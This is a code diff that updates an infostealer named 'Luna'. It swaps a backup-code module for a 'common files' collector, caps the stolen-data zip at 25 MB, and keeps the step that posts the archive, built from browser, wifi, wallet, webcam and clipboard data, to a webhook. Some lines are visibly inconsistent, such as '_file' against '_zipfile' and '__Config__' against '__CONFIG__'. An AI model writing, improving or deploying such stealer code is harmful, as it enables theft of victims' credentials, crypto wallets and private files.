@@ -1,4 +1,5 @@
 import concurrent.futures
+import ctypes
 import json
 import os
 import random
@@ -29,8 +30,8 @@ def main(webhook: str):
         threads.append(Browsers)
     if __CONFIG__["wifi"]:
         threads.append(Wifi)
-    if __CONFIG__["backupcodes"]:
-        threads.append(BackupCodes)
+    if __CONFIG__["common_files"]:
+        threads.append(CommonFiles)
     if __CONFIG__["clipboard"]:
         threads.append(Clipboard)
     if __CONFIG__["webcam"]:
@@ -44,14 +45,21 @@ def main(webhook: str):
     with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as executor:
         executor.map(lambda func: func(), threads)
 
+    max_archive_size = 1024 * 1024 * 25
+    current_archive_size = 0
+
     _zipfile = os.path.join(localappdata, f'Luna-Logged-{os.getlogin()}.zip')
-    zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
-    for dirname, _, files in os.walk(temp_path):
-        for filename in files:
-            absname = os.path.join(dirname, filename)
-            arcname = os.path.relpath(absname, temp_path)
-            zipped_file.write(absname, arcname)
-    zipped_file.close()
+    with ZipFile(_zipfile, "w", ZIP_DEFLATED) as zipped_file:
+        for dirname, _, files in os.walk(temp_path):
+            for filename in files:
+                absname = os.path.join(dirname, filename)
+                arcname = os.path.relpath(absname, temp_path)
+                file_size = os.path.getsize(absname)
+                if current_archive_size + file_size <= max_archive_size:
+                    zipped_file.write(absname, arcname)
+                    current_archive_size += file_size
+                else:
+                    break
 
     data = {
         "username": "Luna",
@@ -65,7 +73,7 @@ def main(webhook: str):
             content = f"@{__CONFIG__['pingtype'].lower()}"
             data.update({"content": content})
 
-    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "backupcodes", "clipboard", "webcam", "wallets", "games"]):
+    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "common_files", "clipboard", "webcam", "wallets", "games"]):
         with open(_file, 'rb') as file:
             encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
             requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
@@ -88,7 +96,8 @@ def Luna(webhook: str):
         except Exception:
             return False
     if not IsConnectedToInternet():
-        sys.exit(0)
+        if not __Config__["startup"]:
+            os._exit(0)
 
     def CreateMutex(mutex: str = "Your Mom") -> bool:
         kernel32 = ctypes.windll.kernel32
